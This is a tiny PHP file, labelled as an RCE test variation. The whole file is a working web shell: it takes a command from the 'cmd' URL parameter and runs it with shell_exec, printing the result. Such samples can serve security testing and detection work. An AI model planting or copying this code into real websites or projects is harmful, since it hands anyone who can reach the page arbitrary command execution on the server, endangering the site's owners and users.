<?php
// RCE test variation #6
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>